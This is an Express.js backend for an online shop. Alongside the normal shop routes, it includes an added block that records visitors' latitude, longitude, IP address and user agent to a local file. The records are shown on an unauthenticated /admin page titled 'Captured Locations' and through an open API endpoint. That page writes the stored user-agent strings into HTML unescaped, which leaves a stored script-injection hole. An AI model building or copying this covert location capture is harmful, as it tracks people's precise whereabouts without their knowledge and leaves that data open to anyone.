require("dotenv").config();

const express = require("express");
const mongoose = require("mongoose");
const cookieParser = require("cookie-parser");
const cors = require("cors");
const path = require('path')
const fs = require('fs')
const authRouter = require("./routes/auth/auth-routes");
const adminProductsRouter = require("./routes/admin/products-routes");
const adminOrderRouter = require("./routes/admin/order-routes");
const shopProductsRouter = require("./routes/shop/products-routes");
const shopCartRouter = require("./routes/shop/cart-routes");
const shopAddressRouter = require("./routes/shop/address-routes");
const shopOrderRouter = require("./routes/shop/order-routes");
const shopSearchRouter = require("./routes/shop/search-routes");
const shopReviewRouter = require("./routes/shop/review-routes");
const couponRouter = require("./routes/common/couponRoutes");
const commonFeatureRouter = require("./routes/common/feature-routes");

const DATA_FILE = path.join(__dirname, 'locations.json')
if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]', 'utf8')

mongoose
  .connect(process.env.MONGO_URL)
  .then(() => console.log("MongoDB connected"))
  .catch((error) => console.log(error));

const app = express();

app.use(
  cors({
    origin: process.env.FRONTEND_URL,
    methods: ["GET", "POST", "DELETE", "PUT"],
    allowedHeaders: [
      "Content-Type",
      "Authorization",
      "Cache-Control",
      "Expires",
      "Pragma",
    ],
    credentials: true,
  })
);

app.use(cookieParser());
app.use(express.json());

// routes
app.use("/api/auth", authRouter);
app.use("/api/admin/products", adminProductsRouter);
app.use("/api/admin/orders", adminOrderRouter);
app.use("/api/shop/products", shopProductsRouter);
app.use("/api/shop/cart", shopCartRouter);
app.use("/api/shop/address", shopAddressRouter);
app.use("/api/shop/order", shopOrderRouter);
app.use("/api/shop/search", shopSearchRouter);
app.use("/api/coupons", couponRouter);
app.use("/api/shop/review", shopReviewRouter);
app.use("/api/common/feature", commonFeatureRouter);

app.post('/api/locations', (req, res) => {
  const { lat, lng, accuracy, timestamp, ua } = req.body || {}
  if (typeof lat !== 'number' || typeof lng !== 'number') {
    return res.status(400).json({ error: 'lat/lng required (number)' })
  }
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress
  const entry = { lat, lng, accuracy, timestamp: timestamp || Date.now(), ua, ip }
  try {
    const list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))
    list.push(entry)
    fs.writeFileSync(DATA_FILE, JSON.stringify(list, null, 2))
  } catch (e) { }
  res.json({ ok: true })
})

app.get('/api/locations', (req, res) => {
  try {
    const list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))
    res.json(list)
  } catch (e) {
    res.json([])
  }
})

app.get('/admin', (req, res) => {
  const list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))
  res.setHeader('Content-Type', 'text/html; charset=utf-8')
  res.end(`<!doctype html>
  <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width">
  <title>Locations Admin</title>
  <style>body{font-family:ui-sans-serif,system-ui,Segoe UI,Roboto,Arial;padding:24px;background:#0b0b0b;color:#fff} table{border-collapse:collapse;width:100%;} th,td{border:1px solid #333;padding:8px;font-size:14px} th{background:#111} tr:nth-child(even){background:#0f0f0f}</style>
  </head><body>
  <h1>Captured Locations</h1>
  <table><thead><tr><th>#</th><th>Lat</th><th>Lng</th><th>Acc (m)</th><th>Timestamp</th><th>IP</th><th>User-Agent</th></tr></thead>
  <tbody>
    ${list.map((r, i) => `<tr><td>${i + 1}</td><td>${r.lat}</td><td>${r.lng}</td><td>${r.accuracy ?? ''}</td><td>${new Date(r.timestamp).toLocaleString()}</td><td>${r.ip ?? ''}</td><td>${(r.ua || '').slice(0, 120)}</td></tr>`).join('')}
  </tbody></table>
  </body></html>`)
})



// ✅ Instead of listening, export the app

if (process.env.NODE_ENV !== "production") {
  const PORT = process.env.PORT || 5001;
  app.listen(PORT, () =>
    console.log(`Server running locally on http://localhost:${PORT}`)
  );
}

module.exports = app;